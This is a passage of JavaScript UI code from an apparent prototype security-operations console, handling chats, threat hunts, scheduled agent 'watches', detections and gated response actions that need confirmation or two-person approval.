    t.title='New chat'; t.evidence=[];t.timeline=[];t.actions=[];t.assignees=[];t.mentions=[];t.narrative='';
    state.inspectorOpen=false;
    renderAll();
  },
  sendComposer(){
    const inp=$('#composerInput');const v=inp.value.trim();
    const t=curThread();
    inp.value=''; autoGrow(inp);
    // day-1 scripted intake: typing walks the hero flow (unchanged)
    if(t.type==='chat' && state.dayStep<dayBeats.length){ nextDay(v||undefined); return; }
    if(!v) return;
    // a typed question maps onto the current suggestion chips (Flow 2 + any chip-driven step)
    const match=matchSuggestion(v, t.suggestions||[]);
    if(match){ if(match.qid){ cfoAsk(match.qid,{typed:v}); } else if(typeof match.fn==='function'){ match.fn(); } return; }
    // Flow 2 fallback: a loosely-worded question still gets the closest evidence-backed answer
    if(t.id==='day-r3'){ const q=bestCfoQuestion(v); if(q){ cfoAsk(q.id,{typed:v}); return; } }
    // otherwise, gentle echo
    pushMsg({role:'user',text:v});
    setTimeout(()=>thinking('Thinking…',()=>pushMsg({role:'agent',prose:`This prototype follows a scripted investigation to demo the core flow end-to-end. Use the suggestions to walk the path — or imagine this as the live agent responding to “${v}”.`}),700),100);
  },
  promoteTo(type){ promoteTo(type); },
  requestPromote(){ // from inspector empty state — nudge into the flow
    const t=curThread();
    if(t.type!=='chat') return;
    if(state.dayStep>=dayBeats.length){ thinking('Assembling…',()=>pushMsg({role:'agent',name:false,promote:true}),600); return; }
    this.toast('info','Keep going','Investigate a bit first — then say “escalate this” and pick a type.');
  },
  approveRecord(type){ approveRecord(type); },
  cfoConfirmRevoke(){ cfoRevoke(); },
  cfoCancelGate(){ cfoCancelGate(); },
  cfoAllowToggle(){ const t=cfoThread(); if(!t) return; t._allowRevoke=!t._allowRevoke; const cb=document.querySelector('.gate-cb'); if(cb) cb.classList.toggle('on', t._allowRevoke); },
  startAction(kind){ chatToRecord(); startAction(kind); },
  confirmAction(kind){ removeRecActionInline(); closeRecActionPopoverDom(); state.recActionKind=null; confirmAction(kind); },
  startAssign(ev){ startAssign(ev); },
  startInvite(ev){ startInvite(ev); },
  titleFocus(e){ const r=document.createRange(); r.selectNodeContents(e.currentTarget); const s=getSelection(); s.removeAllRanges(); s.addRange(r); },
  titleKey(e){ if(e.key==='Enter'){ e.preventDefault(); e.currentTarget.blur(); } else if(e.key==='Escape'){ e.preventDefault(); e.currentTarget.textContent=curThread().title||'New chat'; e.currentTarget.blur(); } },
  renameChat(e){ const t=curThread(); const v=(e.currentTarget.textContent||'').trim().replace(/\s+/g,' '); if(!v){ e.currentTarget.textContent=t.title||'New chat'; return; } t.title=v; e.currentTarget.textContent=v; renderNav(); },
  adoptInvestigation(){ adoptInvestigation(); },
  showEvents(){ showEvents(); },
  openEventFlyout(i){ openEventFlyout(i); },
  closeFlyout(){ closeFlyout(); },
  setApp(k){ ensureWidthFor(k); state.activeApp=k; renderInspector(); },
  closeApp(e,k){ e.stopPropagation(); if(k==='object') return; const a=state.panelApps; const i=a.indexOf(k); if(i<0) return; a.splice(i,1); if(state.activeApp===k){ state.activeApp='object'; } renderInspector(); },
  addApp(k){ if(!state.panelApps.includes(k)) state.panelApps.push(k); ensureWidthFor(k); state.activeApp=k; state.inspectorOpen=true; renderInspector(); },
  toggleAddMenu(e){ e.stopPropagation(); if($('#addMenu')) closeAddMenu(); else openAddMenu(e.currentTarget); },
  togglePanelMax(){ state.panelMax=!state.panelMax; if(state.panelMax) state.panelFlyout=false; renderInspector(); },
  viewInDiscover(){ if(!state.panelApps.includes('discover')) state.panelApps.push('discover'); ensureWidthFor('discover'); state.activeApp='discover'; state.inspectorOpen=true; renderInspector(); toast('info','Opened in Discover','Query and 5 matching events loaded.'); },
  toggleDiscoverField(f){ state.discoverField = state.discoverField===f?null:f; renderInspector(); },
  toggleDiscoFields(){ state.discoverFieldsManual = !discoFieldsCollapsed(); if(state.inspectorOpen && state.activeApp==='discover'){ renderInspector(); } else { const b=document.getElementById('pageBody'); if(b) renderDiscover(b); } },
  setRecordsView(v){ state.recordsView=v; renderInspector(); },
  sortRecords(k){ const s=state.recordsSort||{key:'updated',dir:'desc'}; if(s.key===k) s.dir=s.dir==='desc'?'asc':'desc'; else { s.key=k; s.dir='desc'; } state.recordsSort=s; renderInspector(); },
  recordsSearch(v){ state.recordsQuery=v; const b=document.getElementById('recBody'); const cnt=document.getElementById('recCount'); if(b) b.innerHTML=recordsRowsHTML(); if(cnt) cnt.textContent=recordsCountText(); },
  focusRecord(id){ state.activeId=id; if(!state.panelApps.includes('object')) state.panelApps.unshift('object'); state.activeApp='object'; state.inspectorTab='overview'; renderAll(); },
  casesSearch(v){ state.casesQuery=v; const day=(state.mode||'dayshift')==='dayshift'; const D=CASES_PAGE[day?'dayshift':'nightshift']; const q=(v||'').toLowerCase(); const shown=q?D.rows.filter(r=>r.name.toLowerCase().includes(q)):D.rows; const b=document.getElementById('recBody'); if(b) b.innerHTML=casesRowsHTML(shown); const sb=document.querySelector('.cs-subbar span'); if(sb) sb.textContent='Showing '+shown.length+' of '+D.total+' cases'; },
  setTab(k){ state.inspectorTab=k; renderInspector(); },
  toggleAlertFilters(){ state.alertsFiltersOpen=!state.alertsFiltersOpen; renderApp(); },
  toggleAlertSummary(){ state.alertsSummaryOpen=!state.alertsSummaryOpen; renderApp(); },
  updateBrief(){ const t=curThread(); initBrief(t); if(t.brief.generating) return; if(t.brief.pending>0){ regenBrief(t,'Manual update — '+t.brief.pending+' change'+(t.brief.pending>1?'s':'')); } else { const v=t.brief.versions.slice(-1)[0]; toast('info','Brief is up to date',`Nothing new since v${v?v.v:1}.`); } },
  viewBriefVersion(idx){ const t=curThread(); initBrief(t); t.brief.viewing=idx; renderInspector(); },
  briefLatest(){ const t=curThread(); initBrief(t); t.brief.viewing=null; renderInspector(); },
  toggleBriefVersions(e){ e.stopPropagation(); if($('#bfVers')) closeBriefVersions(); else openBriefVersions(e.currentTarget); },
  gotoEvidence(id){ state.inspectorTab='evidence'; renderInspector(); if(typeof id==='string' && id){ requestAnimationFrame(()=>{ const c=document.getElementById('ecard-'+id); if(c){ c.scrollIntoView({behavior:'smooth',block:'center'}); c.classList.add('flash'); setTimeout(()=>{ const x=document.getElementById('ecard-'+id); if(x) x.classList.remove('flash'); },1500); } }); } },
  formHypothesis(){ chatToRecord(); formHypothesis(); },
  hypoAction(kind){ chatToRecord(); if(kind==='hunt') return huntPeers(); if(kind==='adopt') return adoptInvestigation(); startAction(kind); },
  recAction(kind, ev){
    chatToRecord();   // the workflow continues in this event's conversation
    if(kind==='hunt') return huntPeers();
    if(kind==='assign') return startAssign(ev);
    if(kind==='adopt') return adoptInvestigation();
    if(kind==='isolate' && state.allowIsolate){ confirmAction('isolate',true); return; }
    startAction(kind);
  },
  closeRecAction(){
    if(document.querySelector('.brec-inline')){ removeRecActionInline(); state.recActionKind=null; return; }
    const f=document.getElementById('recActPopover'); const b=document.getElementById('recActBackdrop');
    state.recActionKind=null;
    if(f){ f.classList.add('fly-out'); if(b) b.classList.add('fly-out'); setTimeout(closeRecActionPopoverDom,200); }
    else { closeRecActionPopoverDom(); toast('info','Cancelled','No action taken.'); }
  },
  toggleInspector(){ const wasOpen=state.inspectorOpen; state.inspectorOpen=!state.inspectorOpen; if(state.inspectorOpen && (!state.panelApps||state.panelApps.length===0)){ state.panelApps=['object']; state.activeApp='object'; }
    if(!wasOpen && state.inspectorOpen){
      // Opening the inspector: auto-collapse the secondary nav, but only if it was open.
      if(state.nav.showSecondary!==false){ state.nav.showSecondary=false; state._secAutoClosed=true; }
      else { state._secAutoClosed=false; }
    } else if(wasOpen && !state.inspectorOpen){
      // Closing the inspector: only re-open the secondary nav if WE auto-closed it.
      if(state._secAutoClosed){ state.nav.showSecondary=true; }
      state._secAutoClosed=false;
    }
    applySecondary(); renderInspector(); renderSpine(); renderHomeMain(); },
  toggleAllow(){ state.allowIsolate=!state.allowIsolate; const cb=$('#allowCb'); if(cb) cb.classList.toggle('on',state.allowIsolate); },
  go(dest){ closeCardMore(); if(!dest) dest='home'; if(dest==='agents') state.watchSel=null; if(['workflows','skills','automations','activity','performance','guardrails'].includes(dest)){ if(dest==='automations') dest='workflows'; state.agentsView=dest; dest='agents'; } state.dest=dest; renderRail(); renderStage(); },
  openDashboard(id){ state.dashboardId=id; renderAppPage('dashboards'); },
  openAgentView(key){ state.agentsView=key||'agents'; state.watchSel=null; renderAppPage('agents'); },
  openWatch(id){ state.watchSel=id; state.agentsView='agents'; state.dest='agents'; renderRail(); renderStage(); },
  openWatchName(name){ const w=WATCHES.find(x=>x.name===name); if(w){ App.openWatch(w.id); } else { App.go('agents'); } },
  watchBack(){ state.watchSel=null; renderAppPage('agents'); },
  _refreshHub(){ const b=document.getElementById('agentsBody'); const st=b?b.scrollTop:0; renderAppPage('agents'); const nb=document.getElementById('agentsBody'); if(nb) nb.scrollTop=st; },
  setWatchDesc(id,v){ const w=WATCHES.find(x=>x.id===id); if(!w) return; v=(v||'').trim(); if(!v||v===w.desc) return; w.desc=v; App._refreshHub(); },
  setWatchIcon(id,icn){ const w=WATCHES.find(x=>x.id===id); if(!w||w.icon===icn) return; w.icon=icn; App._refreshHub(); },
  setWatchColor(id,c){ const w=WATCHES.find(x=>x.id===id); if(!w||w.color===c) return; w.color=c; App._refreshHub(); },
  watchIdPop(e,id){ e.stopPropagation(); toggleWatchIdPop(e.currentTarget,id); },
  toggleWatchSurface(id,s){ const w=WATCHES.find(x=>x.id===id); if(!w) return; const i=(w.surfaces||[]).indexOf(s); const label=s==='dayshift'?'NotDaybreak':'NightShift';
    if(i>=0){ if(w.surfaces.length===1){ toast('info','One surface required',`${w.name} must report to at least one surface.`); return; } w.surfaces.splice(i,1); toast('info','Surface removed',`${w.name} no longer reports to ${label}.`); }
    else { w.surfaces.push(s); w.surfaces.sort(); toast('ok','Surface added',`${w.name} now reports to ${label}.`); }
    renderAppPage('agents'); },
  toggleWorkflow(fid){ const f=WORKFLOWS.find(x=>x.id===fid); if(!f) return; f.on=!f.on;
    const asg=(f.watches||[]).map(id=>WATCHES.find(w=>w.id===id)).filter(Boolean);
    const live=asg.filter(w=>w.on);
    const warn=f.on?(!asg.length?'Not assigned to a watch yet — it won’t run.':(!live.length?'All its watches are paused — nothing fires until one resumes.':'')):'';
    toast(f.on?(warn?'warn':'ok'):'info', f.on?'Workflow on':'Workflow off', `${f.name}${asg.length?' — '+asg.map(w=>w.name).join(', '):''}. ${warn}`.trim());
    const b=document.getElementById('agentsBody');
    if(b&&state.dest==='agents'){ const st=b.scrollTop; if(state.watchSel){ const sw=WATCHES.find(x=>x.id===state.watchSel); if(sw) renderWatchDetail(b,sw); } else if((state.agentsView||'agents')==='workflows') renderWorkflowsPage(b); else renderWatchesPage(b); b.scrollTop=st; }
    else renderAppPage('agents'); },
  toggleWatch(id){ const w=WATCHES.find(x=>x.id===id); if(!w) return; w.on=!w.on; if(w.on) w.draft=false; toast(w.on?'ok':'info', w.on?'Watch resumed':'Watch paused', `${w.name} ${w.on?'is back on duty.':'won’t run until you resume it.'}`); renderAppPage('agents'); },

  /* schedule editing — mutate w.sched, re-derive strings + coverage, patch the form in place (keeps scroll) */
  schedMode(id,m){ const w=WATCHES.find(x=>x.id===id); if(!w||!w.sched) return; if(w.sched.set&&w.sched.mode===m) return; const first=!w.sched.set; w.sched.set=true; w.sched.mode=m; applySched(w); rerenderSched(w); toast('ok',first?'Schedule set':'Coverage updated',`${w.name} · ${w.window}${first&&w.draft?' — activate the watch when scoping is done.':''}`); },
  schedTime(id,k,v){ const w=WATCHES.find(x=>x.id===id); if(!w||!w.sched) return; w.sched[k]=Math.max(0,Math.min(23,parseInt(v,10)||0)); applySched(w); rerenderSched(w); toast('ok','Coverage updated',`${w.name} · on duty ${w.window}`); },
  schedDemand(id){ const w=WATCHES.find(x=>x.id===id); if(!w||!w.sched) return; w.sched.onDemand=!w.sched.onDemand; applySched(w); rerenderSched(w); toast('ok','Coverage updated',`${w.name} ${w.sched.onDemand?'now also runs on-demand sessions.':'no longer runs on-demand sessions.'}`); },
  schedCadence(id,v){ const w=WATCHES.find(x=>x.id===id); if(!w||!w.sched) return; w.sched.cadence=v; applySched(w); rerenderSched(w); toast('ok','Cadence updated',`${w.name} · ${w.cadence}`); },
  schedEvery(id,v){ const w=WATCHES.find(x=>x.id===id); if(!w||!w.sched) return; w.sched.every=parseInt(v,10)||60; applySched(w); rerenderSched(w); toast('ok','Cadence updated',`${w.name} · ${w.cadence}`); },
  schedHandoff(id,v){ const w=WATCHES.find(x=>x.id===id); if(!w||!w.sched) return; w.sched.handoff=v; applySched(w); rerenderSched(w); toast('ok','Hand-off updated',`${w.name} · ${w.handoff}`); },

  toggleAgentsNav(){ state.agentsNavCollapsed=!state.agentsNavCollapsed; renderAppPage('agents'); },
  setNavView(key){ closeCardMore(); state.navView=key||'chats'; applySecondary(); renderNav(); renderHomeMain(); },
  goBrief(){ closeCardMore(); state.dest='home'; state.navView='brief'; renderAll(); },
  setQueueView(v){ state.briefQueueView=v||'queue'; renderHomeMain(); },
  goReceipts(){
    const mode2=state.mode||'dayshift';
    const rec=Object.values(state.threads).find(t=>t.mode===mode2 && t.autoResolved && t.status!=='closed');
    const find=()=>rec?document.getElementById('radcard-'+rec.id):null;
    let sec=find();
    if(sec){ const parent=sec.closest('.decision-sec'); if(parent&&parent.classList.contains('dec-collapsed')){ if(!state.collapsedDec) state.collapsedDec={}; state.collapsedDec[parent.id.replace('sec-','')]=false; renderHomeMain(); sec=find(); } }
    const sc=document.querySelector('.brief-scroll'); if(!sc||!sec) return;
    const target=Math.max(0, sec.getBoundingClientRect().top - sc.getBoundingClientRect().top + sc.scrollTop - 120);
    /* rAF ease — element.scrollTo({behavior:'smooth'}) is unreliable in embedded views */
    const from=sc.scrollTop, delta=target-from, t0=performance.now(), dur=Math.min(620, 260+Math.abs(delta)*0.12);
    const ease=x=>1-Math.pow(1-x,3);
    let snapped=false;
    requestAnimationFrame(function step(now){ if(snapped) return; const p=Math.min(1,(now-t0)/dur); sc.scrollTop=from+delta*ease(p); if(p<1) requestAnimationFrame(step); });
    /* rAF is throttled in hidden/embedded views — guarantee the end state */
    setTimeout(()=>{ snapped=true; if(Math.abs(sc.scrollTop-target)>4) sc.scrollTop=target; }, dur+120);
    sec.classList.remove('receipts-ping'); void sec.offsetWidth; sec.classList.add('receipts-ping');
  },
  goChats(){ state.dest='home'; if(!['chats','projects','templates'].includes(state.navView)) state.navView='chats'; renderAll(); },
  toggleDec(d){ if(!state.collapsedDec) state.collapsedDec={}; state.collapsedDec[d]=!state.collapsedDec[d]; renderHomeMain(); },
  toggleTrail(id){ state.trailOpen=state.trailOpen||{}; state.trailOpen[id]=!state.trailOpen[id]; const c=document.getElementById('radcard-'+id); if(!c) return; const open=state.trailOpen[id]; c.classList.toggle('trail-open',open); const l=c.querySelector('.rat-toggle-l'); if(l) l.textContent=(open?'Hide':'Show')+' evidence trail'; },
  archiveRecord(id, opts){
    opts=opts||{};
    const t=state.threads[id]; if(!t || t._archiving) return;
    const fin=()=>{ t._archiving=false; t.status='closed'; state.archSeq=(state.archSeq||0)+1; t.archivedAt=state.archSeq; state.inspectorOpen=false; state.panelFlyout=false; renderAll(); };
    toast('ok',opts.title||'Archived',opts.msg||((t.recordId||'Record')+' moved to archived records.'),{label:'View in Records',go:()=>App.go('records')});
    const c=document.getElementById('radcard-'+id);
    if(!c){ fin(); return; }
    /* Two-beat exit: content settles (fade + 3px lift), then the card collapses and the queue closes up. */
    t._archiving=true;
    c.style.pointerEvents='none';
    c.style.overflow='hidden';
    c.style.maxHeight=c.offsetHeight+'px';
    c.style.transition='opacity .18s ease, transform .18s ease';
    c.style.opacity='0';
    c.style.transform='translateY(-3px)';
    setTimeout(()=>{
      c.style.transition='max-height .25s cubic-bezier(0.32,0.72,0,1), margin .25s cubic-bezier(0.32,0.72,0,1), padding .25s cubic-bezier(0.32,0.72,0,1), border-width .25s cubic-bezier(0.32,0.72,0,1)';
      c.style.maxHeight='0px'; c.style.marginTop='0'; c.style.marginBottom='0';
      c.style.paddingTop='0'; c.style.paddingBottom='0'; c.style.borderWidth='0';
    }, 180);
    setTimeout(fin, 450);
  },
  toggleSecondary(){ state.nav.showSecondary=!state.nav.showSecondary; state._secAutoClosed=false; applySecondary(); renderSpine(); renderHomeMain(); },
  toggleDashNav(){ state.dashNavCollapsed=!state.dashNavCollapsed; renderAppPage('dashboards'); },
  setBriefTab(t){ state.briefTab=t; const p=document.getElementById('briefPanel'); if(p) p.innerHTML=briefPanelHTML(); document.querySelectorAll('.brief-tab').forEach(x=>x.classList.toggle('on', x.dataset.tab===t)); },
  briefSend(){ const inp=$('#briefInput'); const v=inp?inp.value.trim():''; startFromBrief(v); },
  briefStart(i){ const s=briefStarters(state.mode||'dayshift')[i]; if(s) startFromBrief(s.label); },
  briefKey(e){ if(e.key==='Enter'&&!e.shiftKey){ e.preventDefault(); App.briefSend(); } },
  briefAction(kind){ const mode=state.mode||'dayshift'; startFromBrief(mode==='nightshift'?'Start remediation on the critical events.':'Open cases and start response on the highest-risk threats.'); },
  triageAlert(id){ triageAlert(id); },
  recStub(label){
    chatToRecord();
    const t=curThread();
    if(t && t.id==='day-r3' && /revoke active sessions/i.test(label)){ cfoContain(); return; }
    if(t && t.type!=='chat'){
      pushMsg({role:'user',text:label});
      thinking('Preparing the action…',()=>{ pushMsg({role:'agent',name:false,prose:`<b>${label}</b> is a gated action — in the live agent I'd preview the blast radius here and ask you to confirm before anything runs. Nothing has been executed.`}); }, 700);
    } else {
      toast('info', label, 'Gated action — in the live agent this previews blast radius and asks you to confirm.');
    }
  },
  openSki(){
    if(document.getElementById('skiFly')) return;
    document.body.appendChild(el('<div class="ski-mask" id="skiMask" onclick="App.closeSki()"></div>'));
    document.body.appendChild(el(skiFlyHTML()));
    this._skiEsc=(e)=>{ if(e.key==='Escape') App.closeSki(); };
    document.addEventListener('keydown',this._skiEsc);
  },
  closeSki(){
    const f=document.getElementById('skiFly'), m=document.getElementById('skiMask');
    if(f){ f.classList.add('out'); setTimeout(()=>f.remove(),210); }
    if(m){ m.classList.add('out'); setTimeout(()=>m.remove(),210); }
    if(this._skiEsc){ document.removeEventListener('keydown',this._skiEsc); this._skiEsc=null; }
  },
  skiHunt(id){ App.closeSki(); setTimeout(()=>scrollToHunt(id),160); },
  focusHuntComposer(){ const i=document.getElementById('huntInput')||document.querySelector('.hunt-input'); if(i){ i.focus(); } },
  huntKey(e){ if(e.key==='Enter'){ e.preventDefault(); App.runAdhoc(); } },
  runAdhoc(q){
    const night=(state.mode||'dayshift')==='nightshift';
    const inp=document.getElementById('huntInput');
    q = q || (inp && inp.value.trim()) || (night?'p99 regressions':'Encoded PowerShell');
    state.adhocHunt={q,phase:'running'}; renderAppPage('hunt');
    setTimeout(()=>{
      if(!state.adhocHunt || state.adhocHunt.q!==q || state.adhocHunt.phase!=='running') return;
      state.adhocHunt.phase='done'; renderAppPage('hunt');
      if(night) toast('warn','1 SLO breach','search-api p99 is 520ms against a 300ms SLO — still breaching.');
      else toast('warn','1 high-risk execution','Encoded PowerShell download cradle on FIN-WS-04 — click the row to inspect.');
    },1700);
  },
  adhocClear(){ state.adhocHunt=null; renderAppPage('hunt'); },
  adhocSave(){ toast('ok','Saved','Added to your saved hunts.'); },
  runHunt(id){
    if(!state.huntRun) state.huntRun={};
    const S=huntSet();
    state.huntRun[id]='running'; renderAppPage('hunt');
    const h=S.backlog.find(x=>x.id===id)||{};
    toast('info','Hunt running',`${h.title||'hunt'} — querying data sources.`);
    setTimeout(()=>{ state.huntRun[id]='done'; renderAppPage('hunt');
      if(h.find) toast('warn',S.findWord,h.find.head);
      else toast('ok','Hunt complete',S.noFind);
    }, 2200);
  },
  promoteDetection(){ const m=el(detectionModalHTML()); document.body.appendChild(m); },
  closeDetection(){ const m=document.getElementById('detMask'); if(m) m.remove(); },
  confirmDetection(){ App.closeDetection(); const night=(state.mode||'dayshift')==='nightshift';
    if(night) toast('ok','Monitor created','SLI “search-api effective success” created with a 30-day 99.9% target and burn-rate alerts. Versioned — revert anytime.');
    else toast('ok','Detection created','Rule “Service-account interactive logon” created, enabled with 7-day monitoring. Versioned — revert anytime.'); },
  adOpen(id){ state.adSel=id; state.adContKey=null; renderAppPage('discoveries'); },
  adBack(){ state.adSel=null; state.adContKey=null; renderAppPage('discoveries'); },
  adCont(key){ state.adContKey = (state.adContKey===key)?null:key; renderAppPage('discoveries'); },
  adCreate(key,id){
    if(key==='detection'){ App.promoteDetection(); return; }
    if(key==='hunt'){ toast('ok','Hunt proposed','Filed to the hunt backlog with this Attack Discovery as its driver — review it on the Threat hunt page.'); return; }
    const msg={investigate:['Investigation opened','A new investigation was created from the Attack Discovery — the chain, entities, and source discovery are linked. No context rebuilt.'],
      timeline:['Timeline saved','The case timeline was generated and attached to the case.'],
      response:['Response plan opened','The response plan draft is ready — gated steps will ask before they run.'],
      evidence:['Evidence requested','Missing-evidence collection requested; assumptions and open questions logged to the case.'],
      contain:['Containment plan opened','The containment plan draft is ready for approval — each action is reversible and audited.']}[key]||['Done','Saved.'];
    toast('ok',msg[0],msg[1]);
  },
  dwReq(key){ if(!state.dwDone) state.dwDone={}; state.dwDone[key]=true; renderAppPage('deepwatch'); const lbl=(DW_REQ.find(r=>r.key===key)||{}).label||'Analysis'; toast('ok','Analysis ready',`${lbl} drafted into the report.`); },
  dwRem(i){ if(!state.dwRem) state.dwRem={}; state.dwRem[i]=!state.dwRem[i]; renderAppPage('deepwatch'); },
  cardAct(id,i){
    const ai=AI_RADAR[id]||{}; const a=(ai.actions||[])[i]; if(!a) return;
    const cs=cardState(id);
    if(a.gated && !(cs.allow&&cs.allow[i])){ openActionFlyout(id,i); return; }
    cs.done[i]=true; cs.pending=null;
    App.cardRefresh(id);
    if(a.gated) resolveCardFromAction(id,a);
  },
  cardAllow(id,i){ const cs=cardState(id); cs.allow[i]=!cs.allow[i]; if(!refreshActionFlyout()) App.cardRefresh(id); },
  cardConfirm(id,i){
    const cs=cardState(id); const a=((AI_RADAR[id]||{}).actions||[])[i];
    if(a&&a.twoPerson&&!(cs.second&&cs.second[i])){
      if(!cs.second) cs.second={};
      if(cs.secondWait===i) return;
      cs.secondWait=i;
      if(!refreshActionFlyout()) App.cardRefresh(id);
      toast('info','Approval 1 of 2 recorded',`Second approval requested from ${(PEOPLE[a.twoPerson]||{}).name||'the IR lead'} — the action holds until they sign off.`);
      setTimeout(()=>{ cs.second[i]=true; cs.secondWait=null; if(!refreshActionFlyout()) App.cardRefresh(id); toast('ok',`${(PEOPLE[a.twoPerson]||{}).name||'IR lead'} approved`,'2 of 2 — two-person rule satisfied. Executing.'); setTimeout(()=>App.cardConfirm(id,i),700); },2100);
      return;
    }
    cs.done[i]=true; cs.pending=null; closeActionFlyoutDom(); state.actionFlyout=null; App.cardRefresh(id); if(a&&a.done) toast('ok', a.label, a.done); if(a&&a.gated) resolveCardFromAction(id,a); },
  cardCancel(id){ const cs=cardState(id); cs.pending=null; closeActionFlyoutDom(); state.actionFlyout=null; App.cardRefresh(id); },
  cardRefresh(id){ const w=document.getElementById('acts-'+id); const t=state.threads[id]; if(w&&t) w.innerHTML=radarActionRowInner(t, !!w.closest('.rad-mini')); },
  cardMore(id, btn){
    closeCardMore();
    const ai=AI_RADAR[id]||{}; const acts=ai.actions||[]; const cs=cardState(id);
    const order=acts.map((a,i)=>i).sort((x,y)=>(acts[y].gated?1:0)-(acts[x].gated?1:0));
    const hidden=order.filter(i=>!cs.done[i]).slice(1);
    const menu=document.createElement('div');
    menu.className='card-more-pop'; menu.id='cardMorePop';
    let mh=hidden.map(i=>{const a=acts[i];return `<button class="cmp-item${a.gated?' gated':''}" onclick="event.stopPropagation();App.cardMorePick('${id}',${i})">${ic(a.gated?'lock':(a.icon||'bolt'),13)} ${a.label}</button>`;}).join('');
    if(hidden.length) mh+=`<div style="height:1px;background:var(--line);margin:4px 2px"></div>`;
    mh+=`<button class="cmp-item two" onclick="event.stopPropagation();App.cardAssign('${id}',event)">${ic('users',13)} <span class="cmp-b"><span>Assign to…</span><span class="cmp-hint">Hand ownership to a teammate</span></span></button>`;
    mh+=`<button class="cmp-item two" onclick="event.stopPropagation();App.cardDefer('${id}')">${ic('clock',13)} <span class="cmp-b"><span>Defer to next shift</span><span class="cmp-hint">Parks under Monitor · added to the shift handoff</span></span></button>`;
    mh+=`<button class="cmp-item" onclick="event.stopPropagation();App.cardDismiss('${id}')">${ic('check',13)} Dismiss</button>`;
    menu.innerHTML=mh;
    document.body.appendChild(menu);
    const r=btn.getBoundingClientRect();
    menu.style.top=(r.bottom+6)+'px';
    menu.style.left=Math.max(8, r.right - menu.offsetWidth)+'px';
    setTimeout(()=>{ document.addEventListener('mousedown',cardMoreClose); document.addEventListener('scroll',cardMoreScrollClose,true); },30);
  },
  cardMorePick(id,i){ closeCardMore(); App.cardAct(id,i); },
  cardDismiss(id){ closeCardMore(); if(!state.decisionOverride) state.decisionOverride={}; state.decisionOverride[id]='dismiss'; renderHomeMain(); toast('ok','Dismissed','Moved to Dismiss — no action needed.'); },
  cardAssign(id,ev){
    const r=ev&&ev.target&&ev.target.closest('.cmp-item')?ev.target.closest('.cmp-item').getBoundingClientRect():null;
    closeCardMore();
    peoplePicker(r?{currentTarget:{getBoundingClientRect:()=>r}}:null, pid=>{
      const t=state.threads[id]; if(!t) return;
      t.owner=pid;
      if(!state.handoff) state.handoff={deferred:[],note:''};
      renderHomeMain();
      toast('ok',`Assigned to ${PEOPLE[pid].name}`,`${t.recordId||t.title} moves to their queue — the evidence and decision context travel with it.`);
    }, []);
  },
  cardDefer(id){
    closeCardMore();
    if(!state.decisionOverride) state.decisionOverride={};
    state.decisionOverride[id]='monitor';
    if(!state.handoff) state.handoff={deferred:[],note:''};
    if(!state.handoff.deferred.includes(id)) state.handoff.deferred.push(id);
    renderHomeMain();
    toast('ok','Deferred to next shift','Moved to Monitor and filed in the shift-handoff note.');
  },
  handoffOpen(){ App.handoffClose(); document.body.appendChild(el(`<div id="hoWrap">${handoffFlyHTML()}</div>`)); },
  handoffClose(){ const w=document.getElementById('hoWrap'); if(w){ const n=document.getElementById('hoNote'); if(n){ if(!state.handoff) state.handoff={deferred:[],note:''}; state.handoff.note=n.value; } w.remove(); } },
  handoffSend(){ const n=document.getElementById('hoNote'); if(n){ if(!state.handoff) state.handoff={deferred:[],note:''}; state.handoff.note=n.value; } App.handoffClose(); toast('ok','Handoff sent','The compiled note is filed to the 18:00 brief — the next shift opens with it, every decision linked.'); },
  historyOpen(){ App.historyClose(); document.body.appendChild(el(`<div id="histWrap">${historyFlyHTML()}</div>`)); },
  historyClose(){ const w=document.getElementById('histWrap'); if(w) w.remove(); },
  settingsFlyOpen(){ App.settingsFlyClose(); const wrap=el(`<div id="setWrap">${settingsFlyHTML()}</div>`); document.body.appendChild(wrap); fillAutpList(wrap.querySelector('.autp-list'), App.settingsFlyClose); },
  settingsFlyClose(){ const w=document.getElementById('setWrap'); if(w) w.remove(); },
  closeActionFlyout(){
    const f=document.getElementById('actionFlyout'); const b=document.getElementById('actFlyBackdrop');
    state.actionFlyout=null;
    if(f){ f.classList.add('fly-out'); if(b) b.classList.add('fly-out'); setTimeout(closeActionFlyoutDom,200); }
    else closeActionFlyoutDom();
  },
  chatDockToggle(){ clearTimeout(window.__tlDockWarm); state.chatPinned=!state.chatPinned; const d=document.getElementById('chatDock'); if(d){ d.classList.remove('warming'); d.classList.toggle('pinned',state.chatPinned); if(!state.chatPinned) d.classList.remove('open'); try{ syncChatDock(); }catch(e){} if(state.chatPinned){ const ta=document.getElementById('briefInput'); if(ta) ta.focus(); } } },
  chatDockCollapse(){ clearTimeout(window.__tlDockWarm); state.chatPinned=false; const d=document.getElementById('chatDock'); if(d) d.classList.remove('pinned','warming','open'); },
  // Hover intent: warm up (sun spins) for a beat, then open the panel.
  chatDockEnter(){
    const d=document.getElementById('chatDock'); if(!d) return;
    if(state.chatPinned || d.classList.contains('open')) return;
    d.classList.add('warming');
    clearTimeout(window.__tlDockWarm);
    window.__tlDockWarm=setTimeout(()=>{ d.classList.remove('warming'); d.classList.add('open'); },700);
  },
  chatDockLeave(){
    clearTimeout(window.__tlDockWarm);
    const d=document.getElementById('chatDock'); if(!d) return;
    d.classList.remove('warming');
    if(!state.chatPinned) d.classList.remove('open');
  },
  openNavPrefs(){ openNavPrefs(); },
  navpClose(){ closeNavPrefs(); },
  navpToggle(k){ if(navDraft){ navDraft[k]=!navDraft[k]; renderNavPrefs(); } },
  navpEye(idx){ if(!navDraft) return; const a=navDraft.apps[idx]; if(!a||a.locked) return; a.visible=!a.visible; renderNavPrefs(); },
  navpApply(){ if(navDraft){ state.nav=JSON.parse(JSON.stringify(navDraft)); } closeNavPrefs(); renderRail(); applySecondary(); renderSpine(); renderHomeMain(); const cur=(state.nav.apps||[]).find(a=>a.key===state.dest); const hiddenByMode=state.nav.agentMode && cur && cur.group==='operate'; if(state.dest!=='home' && (!cur||!cur.visible||hiddenByMode)){ state.dest='home'; renderStage(); } toast('ok','Navigation updated','Your changes were applied.'); },
  stub(name){ toast('info',name,'Not part of this prototype.'); },
  startTour(){ if(state.navView!=='brief'){ /* ensure home brief so targets exist */ } _tour.steps=buildTourSteps(); _tour.i=0; _tour.active=true; App.closeRailPops&&App.closeRailPops(); tourEnsureDom(); tourRender(); window.addEventListener('resize',tourReposition); document.addEventListener('scroll',tourReposition,{capture:true,passive:true}); },
  tourNext(){ const cur=_tour.steps[_tour.i]; if(_tour.i>=_tour.steps.length-1) return App.tourEnd(); if(cur&&cur.exit){ try{cur.exit();}catch(e){} } _tour.i++; tourRender(); },
